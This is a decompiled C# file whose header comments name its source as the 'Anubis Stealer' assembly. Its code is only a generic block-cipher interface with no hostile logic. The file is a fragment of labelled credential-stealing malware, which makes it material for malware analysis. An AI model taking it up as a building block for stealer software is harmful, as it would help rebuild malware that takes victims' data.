// Decompiled with JetBrains decompiler
// Type: Anubis.IBlockCipher
// Assembly: Anubis Stealer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4CC1199D-65A9-4D34-AA4B-98216B1632A3
// Assembly location: C:\Users\Administrator\Downloads\Build.exe

namespace Anubis
{
  public interface IBlockCipher
  {
    string AlgorithmName { get; }

    bool IsPartialBlockOkay { get; }

    void Init(bool forEncryption, ICipherParameters parameters);

    int GetBlockSize();

    int ProcessBlock(byte[] inBuf, int inOff, byte[] outBuf, int outOff);

    void Reset();
  }
}
